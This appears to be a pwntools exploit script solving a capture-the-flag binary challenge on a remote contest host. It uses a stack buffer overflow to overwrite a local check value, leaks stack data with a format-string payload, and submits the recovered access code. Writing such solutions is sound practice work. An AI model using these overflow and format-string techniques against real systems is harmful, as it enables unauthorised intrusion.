from pwn import *
from sys import argv
from os.path import isfile

target = sys.argv[1]
if not isfile(target):
  print(f'[!] {target}: not found or not a file.')
elf = context.binary = ELF(target, checksec=False)

def start(argv=[], *a, **kw):
  if args.GDB:
    return gdb.debug([target] + argv, gdbscript=gdbscript, *a, **kw)
  elif args.REMOTE:
    if len(argv) != 4:
      print(f'[!] host IP and port not supplied.')
      exit(1)
    return remote(argv[2], argv[3], *a, **kw)
  else:
    return process([target] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

##### settings #####

context.log_level = 'debug'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
args.REMOTE = True

##### template ends #####

#To disable this functionality, set the contents of /Users/vinnie/.cache/.pwntools-cache-3.13/update to 'never' (old way).
#Or add the following lines to ~/.pwn.conf or ~/.config//pwn.conf (or /etc/pwn.conf system-wide):
#[update]
#interval=never
#Arch:       amd64-64-little
#RELRO:      Partial RELRO
#Stack:      No canary found
#NX:         NX enabled
#PIE:        No PIE (0x400000)
#Stripped:   No

# ===========================================================
#          EXPLOIT GOES HERE
# ===========================================================
p = remote('96e94d2f-334b-4969-8725-f8e3e4498388.library.m0unt41n.ch', 31337, ssl=True)
sa = lambda i,o: p.sendlineafter(i,o)

g = cyclic_gen()
sa(b'Your input: ', g.get(92) + p32(3735928559)) # rbp-60h -> rbp-04h == 92
sa(b'Your input: ', b'%30$p')
# [DEBUG] Received 0x70 bytes:
#     b'415f544552434553 4f435f5353454343 a373333315f4544 7f14163e58e0 d 1 1 1Your access code: [-] VR Training failed!\n'
sa(b'Your access code: ', b'SECRET_ACCESS_CODE_1337')

p.interactive()
